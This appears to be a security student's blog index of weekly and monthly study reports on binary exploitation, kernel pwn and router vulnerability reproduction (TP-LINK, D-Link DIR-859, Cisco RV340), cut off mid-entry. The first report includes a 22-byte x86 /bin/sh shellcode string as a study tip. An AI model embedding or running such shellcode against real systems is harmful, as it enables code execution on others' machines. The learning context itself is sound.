<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>周报！月报！年报！</title>
      <link href="/2021/11/17/%E5%91%A8%E6%8A%A5%EF%BC%81%E6%9C%88%E6%8A%A5%EF%BC%81%E5%B9%B4%E6%8A%A5%EF%BC%81/"/>
      <url>/2021/11/17/%E5%91%A8%E6%8A%A5%EF%BC%81%E6%9C%88%E6%8A%A5%EF%BC%81%E5%B9%B4%E6%8A%A5%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h1 id="二一年十月周报（一）"><a href="#二一年十月周报（一）" class="headerlink" title="二一年十月周报（一）"></a>二一年十月周报（一）</h1><blockquote><p>​        从这个月起，周末杂货铺正式开张！由于落后的太多需要跑的更快才能赶上别人，所以开始写周报计划一下，回顾上周学习过的知识以及接下来需要学习的知识，做周报真滴可以提升学习的效率，同时做周报也是件挺快乐的一件事（<code>×</code>水文章</p></blockquote><h3 id="上周学习回顾："><a href="#上周学习回顾：" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复习<code>SROP+orw</code>的基本操作与手法，之前对<code>SROP</code>还有点懵懵懂懂，一直搞不清楚它到底是怎么样劫持控制流的，其实就是在栈上的对应的<code>RIP</code>寄存器上写上要跳转的地方即可（当时可能太浮躁没太注意….</li><li>一直以来都对<code>tache bin attack</code>很恐慌，觉得<code>tache</code>这个新奇玩意有点奇怪，但真正静下心来看看它的攻击手法之后并没有这么的困难</li><li>同样也是对<code>IO_FILE</code>复杂的结构给吓到了，这周终于把它给搞定了！从头到尾都看了看分析了一下，对<code>IO_FILE</code>泄露地址也懂为啥<code>payload</code>要那样写了！</li><li>做了一下串口拿<code>shell</code>的实验，但是并没有成功，原因不详  ㄒoㄒ！！！</li></ul><p>get到的小tips：</p><ul><li><p>保护全开如何查看<code>.bss</code>段内容：<code>vmmap</code>看基地址加上<code>ida</code>里面的偏移即可</p></li><li><p>注意<code>ebp</code>存放的值有可能是一条汇编代码，在PWN溢出的时候，如果打不通，就注意要复原（一般都可以泄露）</p></li><li><p>发现<a href="https://elixir.bootlin.com/linux/latest/source">linux内核源码阅读</a>的网址，啥版本都有，有点牛！</p></li><li><p>x86位很短的shellcode  :lens ==&gt; 22</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80</span><br></pre></td></tr></table></figure><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划"><a href="#下周学习计划" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统的知识</li><li>加深对<code>IO_FILE</code>的理解</li><li>尝试在<code>telnet</code>里面打包文件系统</li><li>有时间建议复现一个CVE（qemu模拟或者是WR-TL841N（它到了的话））</li><li>阅读《庖丁解牛linux内核》尝试调试内核代码</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这周的学习进度又慢了下来，就不知道学啥了，还是多打点比赛，以赛代练，在比赛中查缺补漏，就好像在鹤城中，有题真就白给题居然没做出来….还得再静下心来，加快点脚步才行！</p><h1 id="二一年十月周报（二）"><a href="#二一年十月周报（二）" class="headerlink" title="二一年十月周报（二）"></a>二一年十月周报（二）</h1><h3 id="上周学习回顾：-1"><a href="#上周学习回顾：-1" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>调试<code>linux</code>内核了解<code>linux</code>内核启动过程</li><li>加深对IO_FILE的认知</li><li>复现了TP-LINK WR-TL841N的CVE-2020-8423（模拟的方法）</li><li>拆卸WR-TL841N焊接（焊接是个精细活）上排针进行串口拿<code>shell</code>，还是没有成功….救命…</li></ul><p>get到的小tips：</p><ul><li><p>通过<code>grep</code>字符串查看<code>libc</code>的方法</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-1"><a href="#下周学习计划-1" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统的知识</li><li>尝试在<code>telnet</code>里面打包文件系统（上周并未完成）</li><li>接着复现TP-LINK WR-TL841N</li><li>学习<code>python</code>的<code>scoket</code>编程，熟悉一些网络编程的库函数</li><li>完成<code>start_kernel</code>的调试，并解决完提出的问题</li><li>尝试拿到<code>kernel pwn</code>来练练手，加深对内核的理解</li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这周可能是任务太过难，内核不愧是内核，导致学习的进度赶不上去，不过至少还是学习到了一些内核和操作系统的知识，在复现WR-TL841N不论是在模拟和真机上都碰到不少问题，最恐怖的是真机上，它的固件特别奇怪，有可能是国内和国外的版本不一样，下周继续尝试，串口拿shell的问题还没排查，大致如下：</p><p>可能一：RX和TX线接错了</p><p>解决办法：由于根据其他大师傅的说法，在启动一段时间里面电压变化较大的为<code>TX</code>，但是两个接口都差不多，没办法确认是否接正确了（听说可以将旁边的 3.3 伏特的 15K 电阻器将 TX 拉高），只能换着接</p><p>可能二：焊接问题</p><p>解决办法：只能重新焊，多焊几次就熟悉了….</p><p>可能三：波特率选错</p><p>解决办法：多试几次，因为测试的脚本根本不顶用…</p><p>再拿不到shell就去买小米的那个路由器吧，最后希望广东省强网能进线下吧😔</p><h1 id="二一年十月周报（三）"><a href="#二一年十月周报（三）" class="headerlink" title="二一年十月周报（三）"></a>二一年十月周报（三）</h1><h3 id="上周学习回顾：-2"><a href="#上周学习回顾：-2" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>调试完成linux内核的启动过程，写完《和kernel说个Hello吧！（一）》</li><li>尝试<code>kernel pwn</code>中的<code>ret2user</code></li><li>学了四天的<code>realloc</code>（可能菜狗就是我吧！），才整出一篇文章</li></ul><p>get到的小tips：</p><ul><li><p>man手册真的是个好东西</p></li><li><p><code>%a</code>格式化字符的另一种泄露方法</p><p>———-<em>上周计划是否完成：完成程度较差</em></p></li></ul><h3 id="下周学习计划-2"><a href="#下周学习计划-2" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：3）</li><li>尝试在telnet里面打包文件系统（上周又未完成）（优先级：5）</li><li>接着复现TP-LINK WR-TL841N（上周未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>整理这段时间所学习过的堆利用（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这周只能说为什么完整的理解<code>girlfriend</code>的<code>realloc</code>花了挺多时间来整理的，感觉效率低了一点，一个知识点学4天….，在下周的计划中首次加入任务优先级！为了更高效的完成任务！下周还有个支线任务是漏洞银行的PPT要做，希望能做块一点吧呜呜呜….</p><h1 id="二一年十月周报（四）"><a href="#二一年十月周报（四）" class="headerlink" title="二一年十月周报（四）"></a>二一年十月周报（四）</h1><h3 id="上周学习回顾：-3"><a href="#上周学习回顾：-3" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复现完TP-LINK WR-TL841N，还有点未收尾</li><li>尝试<code>kernel pwn</code>中的<code>ret2user</code>，但是没写完</li><li>整理完最近学习的堆利用</li></ul><p>get到的小tips：</p><ul><li><p>暴力覆盖使得<code>put</code>的时候没有<code>&quot;\x00&quot;</code>泄露<code>libc</code></p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-3"><a href="#下周学习计划-3" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些linux操作系统中的分页（优先级：5）</li><li>看看TP-LINK WR-TL841N还有啥要补充的，接着补充完（优先级：2）</li><li>尝试在telnet里面打包文件系统（上周又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>尝试挖掘路由器的漏洞（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>有个小喜事—-进入了<code>chaMD5</code>团队的IOT小队，认识了一些大哥，也能交流交流了….准备买点设备挖点洞了，选择了一个小厂的企业级路由器来玩，飘了，复现了俩三个洞就敢挑战真实的挖洞了，希望能有个好开端，冲！！！这周学习的进度还是没赶上去</p><p>原因一：</p><p>是要做讲课的PPT</p><p>原因二：</p><p>是qemu模拟太麻了，怎么会这么麻，加油吧！</p><h1 id="十月月报"><a href="#十月月报" class="headerlink" title="十月月报"></a>十月月报</h1><blockquote><p>十月很快就过去了，所以月报也就来了</p></blockquote><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>很快一个月就过去了，这一个月以来学习的东西还是比较充分的，整体的路线没有偏离原来的方向，主线还是在IOT的漏洞挖掘上，在复现了几个路由器的漏洞之后，定下一个小目标，这学期挖出漏洞，不管是难的易的，不管是否为目前已存在的CVE或者CNVD编号的漏洞，不管是<code>web</code>的洞还是二进制的洞，只要是洞并且整个流程都是自己独立分析，<code>exp</code>也是自己独立编写的就算目标完成！希望能够完成吧！留给自己努力的时间不多了…回看这个月，有喜事也有让自己很不开心的事，虽然很多时候真的有点难受，但还是不能停下前进的脚步</p><h4 id="小喜事"><a href="#小喜事" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li><p>成功在安全客发布文章</p></li><li><p>加入chamd5团队</p></li><li><p>受邀参加漏洞银行的大咖讲课</p></li><li><p>学习进度还算稳扎稳打</p></li></ul><h4 id="小难受"><a href="#小难受" class="headerlink" title="小难受"></a>小难受</h4><ul><li>还是没有进入线下赛，也不怪队友啥的，就是自己菜，菜是原罪，不能一打四也是菜，但不能受打击啊！继续努力吧….</li></ul><h4 id="小目标"><a href="#小目标" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！</p><h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>没什么好说了，冲！</p><h1 id="二一年十一月周报（一）"><a href="#二一年十一月周报（一）" class="headerlink" title="二一年十一月周报（一）"></a>二一年十一月周报（一）</h1><h3 id="上周学习回顾：-4"><a href="#上周学习回顾：-4" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充TP-LINK WR-TL841N</li><li>尝试挖掘UTT的漏洞</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-4"><a href="#下周学习计划-4" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>看看TP-LINK WR-TL841N还有啥要补充的，接着补充完（优先级：2）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>尝试通过烧录夹获取固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>真的飘，尝试挖掘UTT的漏洞，发现根本挖不来，不过看到了文件系统里面存在<code>telnet</code>的程序，但是扫描的时候并没有发现<code>telnet</code>服务开启，所以尝试开启它看看有没弱口令挖挖，还是得多复现点漏洞才能在碰到真实的设备的时候有更多的思路，总的来说，由于讲课的缘故，也耗费了不少时间，但也是一次总结知识的机会。</p><h1 id="二一年十一月周报（二）"><a href="#二一年十一月周报（二）" class="headerlink" title="二一年十一月周报（二）"></a>二一年十一月周报（二）</h1><h3 id="上周学习回顾：-5"><a href="#上周学习回顾：-5" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充完TP-LINK WR-TL841N，虽然最后因为环境的问题没有成功打出反弹<code>shell</code>，但此漏洞的所要学习的知识点算是到位了</li><li>尝试挖掘UTT的漏洞</li><li>成功通过烧录夹获取固件</li><li>复现CISCO RV340的命令注入漏洞，再次熟悉一下命令注入以及<code>burpsuite</code>的使用</li></ul><p>get到的小tips：</p><ul><li><p>MIPS当中无效指令填充有些情况下真的很重要！！！</p><ul><li>为了避免指令缓存的情况出现，尽量填充点无效指令</li><li>为了做字符逃逸的shellcode</li></ul></li><li><p>虚拟机传递文件的时候出错去压缩一下就能传了</p><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-5"><a href="#下周学习计划-5" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>挖掘TP-Link的漏洞，它俩的固件似乎和外网上的固件不太一样（优先级：2）</li><li>通过烧录夹获取固件两个TP-Link的固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>看到一篇文章后，再仔细思考了一下内卷的意义，得出两个结论，要想避免内卷有两种方法，一是选择一个比较不卷的方向，二是找到自己的优势区域，目前还没发现自己的优势区域，所以就先走IOT这条稍微没这么卷的路吧！但二者都有个共同点，还是努力，并且积极的去吸取前辈所积累下来的成果，并带着这些成果继续前进，但这里的努力也就脱离了内卷的本质，感触还是挺深的，这周又试了试UTT，找到了一个命令注入，以为可以利用，但其实不然，只能本地玩玩….这玩意的代码写的真的难以言喻</p><h1 id="二一年十一月周报（三）"><a href="#二一年十一月周报（三）" class="headerlink" title="二一年十一月周报（三）"></a>二一年十一月周报（三）</h1><h3 id="上周学习回顾：-6"><a href="#上周学习回顾：-6" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>完成DVRF靶场的题目，熟悉MIPS的ROP链的构造</li><li>补充完TP-LINK WR-TL841N，虽然最后因为环境的问题没有成功打出反弹<code>shell</code>，但此漏洞的所要学习的知识点算是到位了</li><li>尝试挖掘UTT的漏洞</li><li>成功通过烧录夹获取固件</li><li>复现CISCO RV340的命令注入漏洞，再次熟悉一下命令注入以及<code>burpsuite</code>的使用</li></ul><p>get到的小tips：</p><ul><li><p>有时候IDA和Ghidra可能反编译的代码不太一样，可以对照看看，没准会发现新大陆喔！</p><ul><li>原因不详~</li></ul></li><li><p>有时候拿不准是否存在漏洞的时候，写个demo！！！</p><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-6"><a href="#下周学习计划-6" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>阅读《程序员的自我修养》理解一些<code>linux</code>操作系统中的分页（优先级：5）</li><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：4）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：3）</li><li>挖掘TP-Link的漏洞，它俩的固件似乎和外网上的固件不太一样（优先级：2）</li><li>通过烧录夹获取固件两个TP-Link的固件（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>新买了烧录夹，发现还是读取不到，不是夹子不好用，在UTT上一夹就上，真不错，但是TP-link夹半天不行，怕又给夹子夹坏了，就没夹了，估摸着不是夹子问题了这会，回去看了看UTT的洞，害！！！太兴奋了，没看清，那个洞完全没有利用的可能性…. </p><h1 id="二一年十一月周报（四）"><a href="#二一年十一月周报（四）" class="headerlink" title="二一年十一月周报（四）"></a>二一年十一月周报（四）</h1><h3 id="上周学习回顾：-7"><a href="#上周学习回顾：-7" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>分析DIR-859的CVE-2019–20215漏洞</li><li>提取TP-LINK的固件（失败）</li><li>连接TP-LINK的UART串口（失败）</li></ul><p>get到的小tips：</p><ul><li><p>在做kernel pwn的时候，没开-monitor参数的可以尝试qemu逃逸</p></li><li><p>连接串口的时候先不要焊接，先用手扶着看看是不是能成功连上再焊</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-7"><a href="#下周学习计划-7" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又未完成）（优先级：3）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>复现DIR-859的两个漏洞（真实设备）（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>这周终于弄完漏洞银行的演讲，不管讲的如何，至少顺顺利利的完成了，接下来就安心下来好好搞自己的事情了，又买了个路由器来复现DIR-859，希望能学到更多有用的东西，知道如何去构造数据包，给漏洞挖掘提供更多的思路，这次复现完<code>upnp</code>相关的内容之后，可以去看看思考的那个<code>upnp</code>的漏洞了，这玩意最近老爆漏洞，复现多了，没准我也能挖一个（希望如此哈哈哈）！</p><h1 id="十一月月报"><a href="#十一月月报" class="headerlink" title="十一月月报"></a>十一月月报</h1><blockquote><p>十一月也来了，这个月说学的多吧，也不多，只是有了一些新的想法和成果罢了</p></blockquote><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>距离一学期之约也快到了，能不能完成就看这个月了，加油！</p><h4 id="小喜事-1"><a href="#小喜事-1" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li>成功在跳跳糖发布文章</li><li>西湖论剑可能被大哥带进线下</li><li>完成漏洞银行的大咖讲课</li><li>学习进度还算稳扎稳打，漏洞挖掘有了一点眉目了，在构造设备的exp</li></ul><h4 id="小难受-1"><a href="#小难受-1" class="headerlink" title="小难受"></a>小难受</h4><ul><li>挖不到漏洞啊….</li><li>情绪很不稳定</li></ul><h4 id="小目标-1"><a href="#小目标-1" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！，还是这个目标就看能不能完成了，就剩下一个月了</p><h4 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h4><p>挖不出？原因呢？仔细想想原因有以下几点：</p><p>一，对于漏洞点的敏感程度不高，有可能看见漏洞审了一下好像没啥毛病</p><p>二，对设备的攻击面不好把握，虽然知道一些攻击面，但是没有匹配到真实的设备上去，导致有点手忙脚乱</p><p>三，有点浮躁，有时候挖的时候就简单的看看有没危险函数，这样不行，要去慢慢理清他的业务逻辑</p><p>四，非自身原因：洞越挖越少，僧多粥少，这不能怪谁，就是自己没能力</p><p>解决的办法很简单，也是三点：</p><p>一，多复现</p><p>二，多总结</p><p>三，多耐心</p><p>目前的学习路线：</p><ul><li><p>觉得IOT的漏洞挖掘还是得对IOT的一些协议得明白的更多一些</p><ul><li><p>MQTT ==&gt; Toto link</p></li><li><p>UPNP ==&gt; CISCO 0day</p></li><li><p>Bluetooth ==&gt; BLE_CTF    （✔）</p></li></ul></li><li><p>一个设备的启动过程以及程序与程序之间的业务是如何传递信息的</p><ul><li>系统层面的知识：分时操作系统和实时操作系统</li><li>操作系统内核</li><li>U-boot</li></ul></li><li><p>调试接口的使用</p><ul><li>JTAG</li><li>UART    （✔）</li><li>SWD</li></ul></li><li><p>嵌入式webserver</p><ul><li>lighttpd</li><li>GoAhead</li></ul></li><li><p>web方面的漏洞</p></li></ul><h1 id="二一年十二月周报（一）"><a href="#二一年十二月周报（一）" class="headerlink" title="二一年十二月周报（一）"></a>二一年十二月周报（一）</h1><h3 id="上周学习回顾：-8"><a href="#上周学习回顾：-8" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>成功自己编写DIR-859的CVE-2019–20215漏洞的exp并打通（真机，系统级模拟，用户态模拟都试了，这波大满贯）</li><li>复习socket编程</li><li>重新回顾HWS的课程，写写总结</li></ul><p>get到的小tips：</p><ul><li><p>底座很重要，明白底座是什么，更好的确定它的攻击方式</p><ul><li>底座指的是设备使用的操作系统是什么？文件系统呢？通信模型呢？</li></ul><p>———-<em>上周计划是否完成：完成程度不错</em></p></li></ul><h3 id="下周学习计划-8"><a href="#下周学习计划-8" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>尝试在<code>telnet</code>里面打包文件系统（上周又又又又又未完成，救命啊求你快完成吧…）（优先级：3）</li><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>复现DIR-859的一个漏洞（真实设备），并尝试挖掘（优先级：1）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3><p>回顾轩哥讲的HWS，还是收获到不少东西，同个东西在不同的时期看还是感觉不太一样的，这周也自己去完整的写出exp了，大概能明白构造包怎么去构造了，同时也看了看socket，感觉学的不够深，或许西湖论剑进决赛了，希望吧，虽然说基本上稳了，但是名单没有出来之前还是不放心，没准能去薅点设备和见识见识，现在慢慢感觉到一段时间没有产出或者说暂时有个小瓶颈也没什么关系，只要多积累，保持好心态，总会有井喷的一天，机会是留给有准备的人的，打打鸡血，继续上路追梦吧！</p><h1 id="二一年十二月周报（二）"><a href="#二一年十二月周报（二）" class="headerlink" title="二一年十二月周报（二）"></a>二一年十二月周报（二）</h1><h3 id="上周学习回顾：-9"><a href="#上周学习回顾：-9" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>复现DIR-859的一个漏洞（真实设备），并尝试挖掘（未成功）</li><li>梳理攻击路径相关内容</li><li>思考webserver的攻击</li><li>重新回顾HWS的课程，写写总结</li></ul><p>get到的小tips：</p><ul><li><p>ld_preload的64位和32位是不能相互加载的，只能ld_preload本机位数的libc</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-9"><a href="#下周学习计划-9" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>挖掘方面只能边走边看，边复现边思考，最近挖不动了，下周打算补充一些基础知识，做一些其他的研究，再回来看看有没有新思路，发现在我目前的知识网中还是有很多东西是空缺的，虽说知识是张网，从哪里学都一样，但还是要即使的意识到自己知识网中有什么缺陷，并及时的加入到学习计划中去执行。</p><h1 id="二一年十二月周报（三）"><a href="#二一年十二月周报（三）" class="headerlink" title="二一年十二月周报（三）"></a>二一年十二月周报（三）</h1><h3 id="上周学习回顾：-10"><a href="#上周学习回顾：-10" class="headerlink" title="上周学习回顾："></a>上周学习回顾：</h3><p>学习内容：</p><ul><li>成功通过UART拿到shell</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-10"><a href="#下周学习计划-10" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h3><p>这周都在等esp32到，再补作业，没啥好说的….，不过拿到了串口的shell，不错不错。</p><h1 id="二一年十二月周报（四）"><a href="#二一年十二月周报（四）" class="headerlink" title="二一年十二月周报（四）"></a>二一年十二月周报（四）</h1><h3 id="上周学习回顾（12-13-12-19）："><a href="#上周学习回顾（12-13-12-19）：" class="headerlink" title="上周学习回顾（12.13-12.19）："></a>上周学习回顾（12.13-12.19）：</h3><p>学习内容：</p><ul><li>配置ESP32的环境（12.13-12.17）</li><li>做课程设计（12.18）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-11"><a href="#下周学习计划-11" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>周报模板再次更新，加入更精确的时间来检查学习的进度，这周主要还是再弄ESP32，终于配好了，一路踩坑，一路填坑，最终搭建好了环境，下周继续完善相关的内容，之前的CNVD通过审核了，虽说很拉，但至少也算是自己的第一个CNVD了，可喜可贺，继续加油！愈发感觉要想再往上走需要更多的开发能力才行，后面开始安排开发相关的任务才行。</p><h1 id="十二月月报"><a href="#十二月月报" class="headerlink" title="十二月月报"></a>十二月月报</h1><blockquote><p>十二月也来了，一年也结束啦~</p></blockquote><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p>发现人要多出去走走看，就会发现这个世界的美好</p><h4 id="小喜事-2"><a href="#小喜事-2" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li>获得CNVD的证书</li><li>即将拿到天问实验室的offer</li><li>跟澳哥去打创安杯</li></ul><h4 id="小难受-2"><a href="#小难受-2" class="headerlink" title="小难受"></a>小难受</h4><ul><li>挖不到漏洞啊….</li><li>情绪很不稳定</li></ul><h4 id="小目标-2"><a href="#小目标-2" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！，还是这个目标就看能不能完成了，就剩下一个月了</p><h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p>慢慢的也有了自己的人脉，很感慨吧！一路走来，一点点的积累和进步，除了上周的低危CNVD，可能暂时挖不出什么更好的漏洞了，这也是没有办法的事情，挖洞其实不难，难就难在坚持，代码你肯不肯一点点的去审，接口你肯不肯一点点的去调试，多想！肯定能挖出来的！</p><h1 id="二二年一月周报（一）"><a href="#二二年一月周报（一）" class="headerlink" title="二二年一月周报（一）"></a>二二年一月周报（一）</h1><h3 id="上周学习回顾（12-20-12-26）："><a href="#上周学习回顾（12-20-12-26）：" class="headerlink" title="上周学习回顾（12.20-12.26）："></a>上周学习回顾（12.20-12.26）：</h3><p>学习内容：</p><ul><li>完成BLE_CTF的内容（12.20-12.21）</li><li>打创安杯（12.22-12.24）</li><li>复习课程内容（12.25-12.26）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-12"><a href="#下周学习计划-12" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>这周自己慢慢摸索BLE_CTF怎么写，也完成了一大半辽，之后就是有幸和澳哥一起打创安杯，最后虽然没拿到奖，不过也算是获得一段难忘的路程吧！接下来就是复习考试，准备飞杭州~，开启人生新篇章！</p><h1 id="二二年一月周报（二）"><a href="#二二年一月周报（二）" class="headerlink" title="二二年一月周报（二）"></a>二二年一月周报（二）</h1><h3 id="上周学习回顾（12-27-1-2）："><a href="#上周学习回顾（12-27-1-2）：" class="headerlink" title="上周学习回顾（12.27-1.2）："></a>上周学习回顾（12.27-1.2）：</h3><p>学习内容：</p><ul><li>复习课程内容（12.27-1.2）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-13"><a href="#下周学习计划-13" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3><p>复习周略….</p><h1 id="二二年一月周报（三）"><a href="#二二年一月周报（三）" class="headerlink" title="二二年一月周报（三）"></a>二二年一月周报（三）</h1><h3 id="上周学习回顾（1-3-1-9）："><a href="#上周学习回顾（1-3-1-9）：" class="headerlink" title="上周学习回顾（1.3-1.9）："></a>上周学习回顾（1.3-1.9）：</h3><p>学习内容：</p><ul><li>重新搭建python的知识框架（1.3-1.9）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-14"><a href="#下周学习计划-14" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>实习中…..</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3><p>这周已经放假了，重新看看python，代码的功底还是挺重要的！！！</p><h1 id="二二年一月周报（四）"><a href="#二二年一月周报（四）" class="headerlink" title="二二年一月周报（四）"></a>二二年一月周报（四）</h1><h3 id="上周学习回顾（1-10-1-16）："><a href="#上周学习回顾（1-10-1-16）：" class="headerlink" 